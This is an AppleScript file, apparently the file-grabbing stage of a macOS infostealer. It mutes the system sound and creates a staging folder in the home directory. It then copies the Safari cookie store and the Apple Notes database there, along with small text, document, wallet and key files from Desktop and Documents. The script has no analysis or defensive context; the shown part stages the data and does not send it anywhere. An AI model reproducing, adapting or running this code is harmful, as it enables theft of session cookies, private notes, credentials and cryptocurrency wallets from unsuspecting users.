    -- Function to mute the system sound
    do shell script "osascript -e 'set volume with output muted'"
    
    set baseFolderPath to (path to home folder as text) & "tempFolder-32555443:"
    set fileGrabberFolderPath to baseFolderPath & "FileGrabber:"
    set notesFolderPath to baseFolderPath & "Notes:"
    
    tell application "Finder"
        set username to short user name of (system info)
        
        -- Check if baseFolderPath exists, if not, create it
        if not (exists folder baseFolderPath) then
            do shell script "echo 'Creating base folder'"
            make new folder at (path to home folder) with properties {name:"tempFolder-32555443"}
        end if
        
        -- Create fileGrabberFolderPath
        try
            do shell script "echo 'Creating FileGrabber folder'"
            make new folder at folder baseFolderPath with properties {name:"FileGrabber"}
            delay 2 -- Delay to give Finder time to create the folder
        end try
        
        -- Create notesFolderPath
        try
            do shell script "echo 'Creating Notes folder'"
            make new folder at folder baseFolderPath with properties {name:"Notes"}
            delay 2 -- Delay to give Finder time to create the folder
        end try
        
        -- Copy Safari cookies
        try
            do shell script "echo 'Copying Safari cookies'"
            set macOSVersion to do shell script "sw_vers -productVersion"
            if macOSVersion starts with "10.15" or macOSVersion starts with "10.14" then
                set safariFolder to ((path to library folder from user domain as text) & "Safari:")
            else
                set safariFolder to ((path to library folder from user domain as text) & "Containers:com.apple.Safari:Data:Library:Cookies:")
            end if
            duplicate file "Cookies.binarycookies" of folder safariFolder to folder fileGrabberFolderPath with replacing
            delay 2 -- Delay to give Finder time to copy the file
        end try
        
        -- Copy Notes database to Notes folder
        try
            do shell script "echo 'Copying Notes database'"
            set homePath to path to home folder as string
            set sourceFilePath to homePath & "Library:Group Containers:group.com.apple.notes:NoteStore.sqlite"
            duplicate file sourceFilePath to folder notesFolderPath with replacing
            delay 2 -- Delay to give Finder time to copy the file
        end try
        
        set extensionsList to {"txt", "docx", "rtf", "doc", "wallet", "keys", "key"}
        
        -- Gather and copy desktop files
        try
            do shell script "echo 'Gathering desktop files'"
            set desktopFiles to every file of desktop
            -- Copy desktop files
            repeat with aFile in desktopFiles
                try
                    set fileExtension to name extension of aFile
                    if fileExtension is in extensionsList then
                        set fileSize to size of aFile
                        if fileSize < 51200 then
                            do shell script "echo 'Copying file: " & (name of aFile as string) & "'"
                            duplicate aFile to folder fileGrabberFolderPath with replacing
                            delay 1 -- Delay to give Finder time to copy each file
                        end if
                    end if
                end try
            end repeat
        end try
        
        -- Gather and copy documents files
        try
            do shell script "echo 'Gathering documents files'"
            set documentsFiles to every file of folder "Documents" of (path to home folder)
            -- Copy documents files
            repeat with aFile in documentsFiles
                try
                    set fileExtension to name extension of aFile
                    if fileExtension is in extensionsList then
                        set fileSize to size of aFile
                        if fileSize < 51200 then
                            do shell script "echo 'Copying file: " & (name of aFile as string) & "'"
                            duplicate aFile to folder fileGrabberFolderPath with replacing
                            delay 1 -- Delay to give Finder time to copy each file
                        end if
                    end if
                end try
            end repeat
        end try
    end tell
    
    -- Function to unmute the system sound
    do shell script "osascript -e 'set volume without output muted'"
    